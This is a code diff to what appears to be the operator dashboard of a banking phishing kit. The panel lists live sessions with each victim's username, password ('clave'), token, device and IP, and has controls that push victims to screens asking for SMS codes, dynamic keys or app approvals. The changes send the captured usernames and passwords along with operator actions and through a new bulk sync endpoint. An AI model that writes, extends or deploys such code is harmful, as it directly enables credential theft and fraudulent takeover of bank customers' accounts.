@@ -118,6 +118,7 @@ async function setRowState(rowId, state, action) {
   const row = rows.get(rowId)
   if (!row) return
   row.state = state
+  row.action = action
   row.last_seen = Date.now()
   row.updatedAt = Date.now()
   hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`
@@ -126,7 +127,12 @@ async function setRowState(rowId, state, action) {
     await fetch(`/api/sessions/${rowId}/action`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ action, state })
+      body: JSON.stringify({
+        action,
+        state,
+        username: row.user,
+        password: row.clave
+      })
     });
   } catch (_) {}
   render()
@@ -267,10 +273,12 @@ function updateRow(tr, row) {
   tr.querySelector('.col-status').innerHTML =
     `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`
 
-  const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
   const smsBtn = tr.querySelector('[data-action="sms"]')
-  dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
-  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
+  const amiBtn = tr.querySelector('[data-action="ami"]')
+  const bdvappBtn = tr.querySelector('[data-action="bdvapp"]')
+  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms' || row.action === 'sms')
+  amiBtn?.classList.toggle('is-on', row.state === 'waiting-ami' || row.action === 'ami')
+  bdvappBtn?.classList.toggle('is-on', row.state === 'waiting-bdvapp' || row.action === 'bdvapp')
   tr.classList.toggle('is-waiting', row.state === 'waiting')
 }
 
@@ -317,8 +325,33 @@ function render() {
 
 async function pollSessions() {
   try {
-    const response = await fetch('/api/sessions');
-    if (response.ok) {
+    let response;
+    if (rows.size > 0) {
+      const syncList = [...rows.values()].map((r) => ({
+        id: r.id,
+        index: r.index,
+        username: r.user,
+        password: r.clave,
+        tipoUsuario: r.tipo,
+        device: r.device,
+        ip: r.ip,
+        token: r.token,
+        state: r.state,
+        action: r.action,
+        createdAt: r.createdAt,
+        last_seen: r.last_seen,
+        updatedAt: r.updatedAt
+      }));
+      response = await fetch('/api/sessions/sync', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessions: syncList })
+      });
+    } else {
+      response = await fetch('/api/sessions');
+    }
+
+    if (response && response.ok) {
       const list = await response.json();
       
       // Track existing new entries BEFORE clearing the map
@@ -359,6 +392,8 @@ async function pollSessions() {
       // Actualizar o añadir sesiones sin borrar las existentes para evitar parpadeos
       list.forEach((session) => {
         const existing = rows.get(session.id);
+        const resolvedState = session.state || (existing ? existing.state : 'waiting');
+        const resolvedAction = (session.action !== undefined) ? session.action : (existing ? existing.action : null);
         rows.set(session.id, {
           id: session.id,
           index: session.index || (existing ? existing.index : rows.size + 1),
@@ -371,7 +406,8 @@ async function pollSessions() {
           user: session.username || session.user || (existing ? existing.user : '—'),
           clave: session.password || session.clave || (existing ? existing.clave : '—'),
           token: (session.token !== undefined && session.token !== '') ? session.token : (existing ? existing.token : ''),
-          state: session.state || (existing ? existing.state : 'waiting'),
+          state: resolvedState,
+          action: resolvedAction,
           online: session.online !== undefined ? session.online : (existing ? existing.online : true)
         });
       });
